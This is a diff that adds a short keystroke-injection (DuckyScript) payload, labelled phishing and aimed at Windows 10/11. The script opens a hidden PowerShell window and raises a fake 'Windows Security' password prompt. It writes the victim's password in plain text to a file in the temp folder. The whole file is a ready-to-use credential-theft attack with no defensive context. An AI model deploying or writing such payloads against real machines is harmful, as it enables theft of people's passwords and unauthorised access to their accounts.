@@ -1,0 +1,16 @@
+REM =====================================================
+REM Title: Fake Windows Login Prompt
+REM Author: yogeshjoga
+REM Target: Windows 10/11
+REM Category: Phishing
+REM Description: Creates a fake Windows login prompt to harvest credentials
+REM =====================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 1000
+STRING $cred = $host.ui.PromptForCredential('Windows Security', 'Please enter your password to continue', $env:username, ''); $cred.GetNetworkCredential().Password | Out-File $env:TEMP\creds.txt; exit
+ENTER
